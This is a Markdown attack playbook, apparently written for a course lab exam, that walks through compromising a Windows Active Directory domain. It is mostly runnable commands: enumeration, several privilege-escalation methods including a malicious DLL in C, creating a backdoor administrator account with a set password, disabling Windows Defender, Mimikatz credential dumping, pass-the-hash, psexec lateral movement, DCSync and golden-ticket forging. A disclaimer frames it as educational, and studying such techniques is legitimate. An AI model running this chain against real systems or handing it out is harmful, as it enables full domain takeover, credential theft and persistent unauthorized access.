
> **Disclaimer:** The following instructions are provided as guidance for the skills test planned based on the lab sessions performed in the course. These instructions are not to be used for any malicious purposes and are intended solely for educational purposes. They should be used in a controlled environment, and the author of the instructions is not responsible for any misuse of the information provided. Many of these instructions are inspired by [Inside Job](https://github.com/Ardemium/InsideJob) and have been significantly modified to fit the requirements of the owner of this repository.


# Step-by-Step Attack Process

## Initial Enumeration of the Environment

### 1. Determine Local Domain and User Information
To gather basic information about the user and domain environment, use the following commands:

```bash
whoami
hostname
systeminfo
echo %logonserver%

```
- **whoami**: Displays the currently logged-in user.
- **hostname**: Reveals the name of the local machine.
- **systeminfo**: Shows detailed system information, including the domain and the `Logon Server`, which identifies the domain controller.

### 2. Enumerate Domain Groups and Users
To understand the structure of domain groups and identify privileged users:

```bash
//to find domain users
net user /domain

//to find domain groups
net group /domain
//to find users from the group domain admins
net group "domain admins" /domain
```
- **net group /domain**: Lists all domain groups.
- **net group "domain admins" /domain**: Lists users in the "Domain Admins" group, showing which users have elevated privileges.

---

## Gaining Administrative Access, Privilege Escalation, and Disabling Windows Defender

### 3. Get an Admin Command Prompt
Use **Remote Mouse** to quickly gain access to an administrator command prompt on the target system.

### tips to identify services with vulnerabilites and exploit them to execute custom commands with elevated privileges.
use the followign command to identify services running from outside windows system32 directory
```bash
wmic service get name,displayname,pathname | findstr /i /v "C:\\Windows\\System32\\"
```

### Additional Tool: Autoruns

If you have access to **Autoruns** from Sysinternals, you can use it to inspect abnormal services as well.

**Autoruns**: This tool will show all services, scheduled tasks, startup programs, and more. It will highlight non-standard services that are automatically executed, helping you identify anything that looks suspicious or was recently added.
### 4. Privilege Escalation Using Identified Services

#### a) **RemoteMouseService (CVE-2021-35448)**
This vulnerability in the **Remote Mouse** application allows attackers to open an elevated command prompt:
1. **Access the Remote Mouse Settings**:
   - Right-click on the Remote Mouse icon in the system tray and open the settings.
   
2. **Change the Image Transfer Folder**:
   - In the settings, locate the option to change the image transfer folder.
   - Change the folder path to `C:\Windows\System32\cmd.exe` and press Enter.

3. **Open an Admin Command Prompt**:
   - This action will spawn an elevated command prompt. Verify privileges with:
   ```bash
   whoami
   ```
   - You should see `nt authority\system`.

#### b) **Unquoted Service Path Vulnerability**
Exploiting unquoted service paths:
1. Identify services with unquoted paths using:
   ```bash
   wmic service get name,displayname,pathname | findstr /i /v "C:\\Windows\\System32\\"
   ```
2. If an unquoted path exists, place a malicious executable in a directory matching the path to execute your payload.

#### c) **Insecure Registry Service Exploit**
**Cudos to [Ardemium](https://github.com/Ardemium/InsideJob) for the tip.** 
Using the **ModifyServiceImagePath.bat** script to modify the `ImagePath`:
if you're willing to use this script you will need to download it from the link above and run it in the target machine or use the following command to fetch it:
```bash
curl -L -o "%USERPROFILE%\ModifyServiceImagePath.bat" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/utils/ModifyServiceImagePath.bat
```

1. Identify the service with insecure registry keys using **Autoruns** or **AccessChk**.
2. Run the **ModifyServiceImagePath.bat** script to point the service to your custom payload.
3. Restart the service to execute the payload:
   ```bash
   net stop <ServiceName> && net start <ServiceName>
   ```


#### d) **DLL Hijacking**
Identify services that load DLLs from insecure directories. Replace the legitimate or missing DLLs with a malicious one to execute code with the service’s privilege level. Follow these steps:

1. **Identify Missing or Vulnerable DLLs:**
   - Use a tool like **ProcMon** to detect which DLLs the service attempts to load but cannot find.
   - Configure a filter in ProcMon to focus on the target process:
     - Column: `Process Name`
     - Relation: `is`
     - Value: `<service_name>`
     - Action: `include`
   - Look for DLLs that the service tries to load from its directory or system paths but fails to find.

2. **Prepare the Environment:**
   - If you lack administrative privileges to run ProcMon, you can set up the service on a machine where you have admin access:
     ```bash
     sc create <service_name> binpath="C:\path\to\service.exe"
     ```
   - Replace `<service_name>` with the name you want to give the service.

3. **Create a Malicious DLL:**
   - Write a DLL that executes your desired payload (e.g., creating a new user or running a specific command). Below is a basic example:
     ```c
     #include <windows.h>

     BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
         if (dwReason == DLL_PROCESS_ATTACH) {
             system("<payload_command>");
             ExitProcess(0);
         }
         return TRUE;
     }
     ```
   - Replace `<payload_command>` with the command you want the DLL to execute.
   - Compile the DLL using a cross-compiler:
     - For 64-bit systems:
       ```bash
       x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
       ```
     - For 32-bit systems:
       ```bash
       i686-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
       ```

4. **Deploy the Malicious DLL:**
   - Copy the compiled DLL to the directory where the service expects to find the missing DLL:
     ```bash
     copy Z:\hijackme.dll "C:\path\to\service\directory"
     ```

5. **Restart the Service:**
   - Restart the service to trigger the malicious DLL:
     ```bash
     sc stop <service_name>
     sc start <service_name>
     ```



#### e) **Service Misconfiguration Exploitation DC permission (Change Configuration being granted to the Everyone group).**
Identify services with improper permissions using **AccessChk** and modify them to execute custom commands if non-admin users have the right to change configurations. Follow these steps:

1. **Check Service Permissions:**
   - Use the `accesschk.exe` utility from the Sysinternals suite to review service permissions. Run the following command:
     ```bash
     %USERPROFILE%\SysinternalsSuite\accesschk.exe -uwvc "your_username" *
     ```
   - Replace `"your_username"` with the name of the user account you're checking. Look for `SERVICE_CHANGE_CONFIG` in the output, which indicates that this user can modify the service configuration.

2. **Interpret the Results:**
   - If the `SERVICE_CHANGE_CONFIG` permission is found, the user can modify the service’s configuration, including its executable path, allowing for potential misuse.

3. **Modify the Service Path:**
   - Use the `sc config` command to change the service’s binary path, specifying a command or script you wish to execute:
     ```bash
     sc config <service_name> binPath= "<custom_command>"
     ```
   - Replace `<service_name>` with the name of the target service and `<custom_command>` with the command you want to run.

4. **Restart the Service:**
   - Restart the service to apply the new configuration and trigger the execution of your specified command:
     ```bash
     sc stop <service_name>
     sc start <service_name>
     ```

Here’s a generic version of the tip for file permission exploitation based on the example provided:

#### f) **File Permission Exploitation**
Exploit services with misconfigured file permissions by replacing their executables with custom payloads. Follow these steps:

1. **Find the Service Path:**
   - Identify the executable path of the target service using the `sc qc` command:
     ```bash
     sc qc <service_name>
     ```
   - Replace `<service_name>` with the actual name of the service. Look for the `BINARY_PATH_NAME` field in the output to find the path of the service's executable.

2. **Check File Permissions:**
   - Use the `icacls` command to verify who has access to modify the service's executable:
     ```bash
     icacls "C:\path\to\service\executable.exe"
     ```
   - Focus on the permission flags:
     - **(F)** – Full control: Allows reading, writing, deleting, and changing permissions.
     - **(M)** – Modify: Allows reading, writing, and deleting files.
   - If non-admin groups like `BUILTIN\Users` or `Everyone` have (F) or (M) permissions, you can replace or modify the service executable.

3. **Create a Payload:**
   - Write a simple script or batch file that performs the desired action (e.g., creating a user). For example:
     ```batch
     net user <username> <password> /add && net localgroup administrators <username> /add
     ```
   - Replace `<username>` and `<password>` with the desired credentials.

4. **Convert Script to Executable (Optional):**
   - Use a tool like **bat2exe** to convert the batch file into an executable, if needed:
     ```bash
     bat2exe file.bat
     ```

5. **Deploy the Payload:**
   - Replace the original service executable with your payload:
     ```bash
     copy /Y Z:\payload.exe "C:\path\to\service\executable.exe"
     ```

6. **Restart the Service:**
   - Restart the service to trigger the execution of the modified executable:
     ```bash
     sc stop <service_name>
     sc start <service_name>
     ```
Here’s the updated version of the tip with the additional information included:

#### g) **Scheduled Task Exploitation**
Identify scheduled tasks running under elevated accounts where you have indirect permission to modify the associated scripts. Follow these steps:

1. **Find Accessible Scheduled Tasks:**
   - Use **Task Scheduler** to identify tasks that you have access to. You can also find tasks that you don’t have access to, providing insight into other potential targets.
   - Explore `C:\Windows\system32`. Some systems that missed updates may still have the `C:\Windows\TasksMigrated` folder, making it readable.

2. **Check File and Folder Permissions:**
   - Scheduled tasks can often be found at `C:\Windows\TasksMigrated`.
   - Parent folders may not have strict permissions compared to their contents. Try modifying the parent folder by renaming or replacing it to disrupt scheduled task calls. This could allow you to create your own files or tasks in place of the existing ones, which will execute your code when the task runs with elevated privileges.

3. **Check and Modify Task Script Permissions:**
   - Use the `icacls` command to see if you can edit the script or file the task runs:
     ```bash
     icacls C:\path\to\script.bat
     ```
   - Focus on permission levels, such as **(RX)** (Read & Execute) and **(F)** (Full Control). If you only have **(RX)** on the file, it means you can't modify it directly.
   - Check the permissions on the folder containing the script:
     ```bash
     icacls C:\path\to\folder
     ```
   - If **(F)** or **(M)** (Modify) permissions are available for your user group on the folder, you can delete and recreate the folder contents.

4. **Bypass File Restrictions:**
   - If direct modification of the script is restricted, delete the folder containing the script and recreate it with your own version. For example:
     ```bash
     del C:\path\to\folder
     mkdir C:\path\to\folder
     ```
   - Add your custom script to the folder:
     ```bash
     echo <custom_command> > C:\path\to\folder\script.bat
     ```
   - Replace `<custom_command>` with the desired payload or command.

5. **Analyze Task Files:**
   - When exploring a task file, look for details such as:
     - **Trigger Time**: When the task is scheduled to run.
     - **Executable Path**: The script, executable, or command that the task triggers.
     - **Run Conditions**: Details like whether it runs at logon, startup, or specific time intervals.
   - Understanding this information allows you to plan the best time to execute your modified script or replace the executable path with your payload.

6. **Trigger the Scheduled Task:**
   - If the task is set to run at a specific time or on logon, you can trigger it by logging off and back on.
   - Alternatively, run the task manually using the following command:
     ```bash
     schtasks /run /tn "<task_name>"
     ```
   - Replace `<task_name>` with the name of the scheduled task.

By following these steps, you can exploit scheduled tasks where direct file modifications are restricted but folder access is available. This allows you to replace the executed script and run commands with elevated privileges, leveraging both accessible task details and potential weaknesses in folder permissions.
These steps allow you to exploit services with insecure file permissions, gaining the ability to execute custom commands with the service’s privilege level by replacing its executable.

These steps can help you exploit services with misconfigured permissions, allowing execution of commands or payloads with the service’s privileges.
---

### 5. Create a Helpdesk User with Admin Rights
Once elevated, create a new user and add them to the Administrators group:
```bash
net user helpdesk L3tm3!n /add
net localgroup Administrators helpdesk /add
```

### 6. Disable Windows Defender and Create an Exclusion
- Log in as **helpdesk**.
- Disable Windows Defender through the GUI.
- Add an exclusion for `C:/`.

---

## Downloading and Running Tools for Exploitation

### 7. Download Mimikatz and Sysinternals Suite
- **Mimikatz**: For credential extraction.
- **Sysinternals Suite**: For monitoring and service enumeration.


#### 8. **Run Mimikatz with Elevated Privileges**
Open **Mimikatz** and attempt to enable privilege escalation:

```bash
mimikatz.exe
privilege::debug
```

- **Note:** If `privilege::debug` fails because debug privileges are disabled for the administrator account, you can attempt to bypass this restriction using **PsExec** to run Mimikatz as the `SYSTEM` user:

```bash
psexec -s -i cmd.exe
```

- This command launches a new command prompt with `SYSTEM` privileges, allowing you to run `mimikatz` from there, potentially bypassing the debug privilege restriction:

```bash
mimikatz.exe
```

- Running Mimikatz from a `SYSTEM` context can help you access features that require higher privileges, even if the `privilege::debug` command is blocked.
### 9. Dump Credentials
Extract user credentials:
```bash
sekurlsa::logonpasswords
```

---

## Pass-the-Hash Attack

### 10. Perform Pass-the-Hash Attack
Use the NTLM hash of an admin to impersonate their session:
```bash
sekurlsa::pth /user:Administrator /domain:win10client /ntlm:[admin_hash]
```

### 11. Test Access to the Remote System
To confirm access:
```bash
dir \\192.168.56.30\c$
```

---

## Further Enumeration and Persistence

to connect to the remote device you should psexec a new remote session. do that by doing:
```bash
psexec.exe -r <processname> /accepteula \\remote_ip cmd.exe
```

### 12. Create a Temporary Folder
```bash
cd C:\
mkdir temp
```

### 13. Add Folder to Windows Defender Exclusions
In PowerShell:
```bash
powershell
add-mppreference -exclusionpath C:\temp
get-mppreference
```

### 14. Pass-the-Hash in a Second Terminal
Repeat the pass-the-hash attack in a second terminal:
```bash
sekurlsa::pth /user:Administrator /domain:win10client /ntlm:[admin_hash]
```

### 15. Map a Network Drive and Change Directory
In the second terminal:
```bash
net use X: \\192.168.50.30\c$
X:
cd temp
```

### 16. Copy and Execute Mimikatz in Temp Directory
- **First terminal**: `cd temp`
- **Second terminal**: Copy Mimikatz files:
```bash
copy {mimikatz_path_to_x64_folder}\*.* .
```
- **First terminal**: Execute **Mimikatz** when the copy is complete.

### 17. Now that you have the mimikatz on the admin machine make sure to use it as following
- just like before we start with dumping the hashes and getting the debug privilege
  ```bash
  privilege::debug
  sekurlsa::logonpasswords
  ```
- Find the admin's hash and use that to pass the hash into his account (from your own machine of course)
- your command should now be targeting the dc not your local domain
- example:
```bash
sekurlsa::pth /user:domad /domain:adlab.local /ntlm:cff48581d56085119bddffacfae51aeb /run:cmd.exe
```

- from there you can launch mimikatz again and continue to dump the credintials

## Persistence with Golden Ticket Attack

### 1. Dump Domain Controller Hashes
Dump credentials from the Domain Controller:
```bash
lsadump::dcsync /domain:adlab.local /all /csv
```

### 2. Create a Golden Ticket
Use the **krbtgt** hash and your system's **SID** to create a Kerberos golden ticket:
```bash
kerberos::golden /domain:adlab.local /sid:S-1-5-21-2477219160-184884731-442278832 /rc4:[krbtgt_hash] /user:fuckoff /id:500 /ptt
```

### 3. Open a Miscellaneous Command Prompt
```bash
misc::cmd
```

